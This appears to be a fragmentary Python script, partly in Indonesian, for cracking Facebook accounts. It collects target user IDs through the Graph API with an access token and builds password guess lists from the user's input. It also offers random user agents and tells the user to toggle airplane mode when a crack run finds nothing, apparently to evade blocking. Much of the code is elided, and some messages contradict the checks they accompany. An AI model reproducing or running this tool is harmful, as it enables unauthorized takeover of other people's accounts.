...
def dump_old():
        ...
        for dot in range(nada):
                ...
                tampung = []
                non_old = []
                uid = input(balmond+l+" put ID Target Ke %s : "%(dot))
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(balmond+l+" Nama : "+tulul["name"])
...
def follow():
	...
	try:
		...
		if jumlah>5000:
			jalan(balmond+m+" Maximum 50000 ID")
			time.sleep(0.5)
			follow()
	except ValueError:
		jalan(balmond+m+" Input Invalid")
...
def mode_password():
	...
	if mode=="d" or mode=="D":
		...
		print("\n"+balmond+l+" put Password Manual")
		print(balmond+l+" Miniman 6 character 1 Password")
		print(balmond+l+" Contoh : "+k+"sayang,bismillah,katasandi")
		pwa = input(balmond+l+" Password Manual : "+h+"")
		cewe = pwa.split(",")
		if len(cewe)>7:
			jalan("\n"+balmond+m+" Don't be greedy bro, Minimal 7 Password Aja")
			time.sleep(0.5)
			exit()
		for cowok in cewe:
		...
		print("\n"+balmond+l+" put Password Addition")
		print(balmond+l+" Miniman 6 character 1 Password")
		print(balmond+l+" Contoh : "+k+"sayang,bismillah,katasandi")
		pwa = input(balmond+l+" Password Tambahan : "+h+"")
		cewe = pwa.split(",")
		if len(cewe)>5:
			jalan("\n"+balmond+m+" Just chil follow me, Minimal 5 Password Aja")
			time.sleep(0.5)
			exit()
		for cowok in cewe:
			if len(cowok)==1 or len(cowok)==2 or len(cowok)==3 or len(cowok)==4 or len(cowok)==5:
...
def mode_crack():
	...
	pilih = input("\n"+balmond+l+" Pilih : ")
	if pilih=="1" or pilih=="01":
		print("\n"+balmond+l+" press "+h+"'y'"+l+" If you want to use Random User Agent")
		print(balmond+l+" Press Enter If you want to use Random User Agent")
		agenku = input(balmond+l+" use User Agent Random "+k+"{"+h+"Recomended"+k+"}"+l+" : ")
		if agenku=="y" or agenku=="Y":
			random_gak.append("random")
		else:
			kopi = "enak"
		print("\n"+balmond+l+" Crack start")
		print(balmond+l+" If No Result, Turn On Airplane Mode 5sec\n")
		default()
	elif pilih=="2" or pilih=="02":
		print("\n"+balmond+l+" Tekan "+h+"'y'"+l+" If you want to use Random User Agent")
		print(balmond+l+" Tekan Enter If you want to use Random User Agent")
		agenku = input(balmond+l+" Use User Agent Random "+k+"{"+h+"Recomended"+k+"}"+l+" : ")
		if agenku=="y" or agenku=="Y":
			random_gak.append("random")
		else:
		...
		print(balmond+l+" If No Result, Turn On Airplane Mode  5 sec\n")
		default2()
	else:
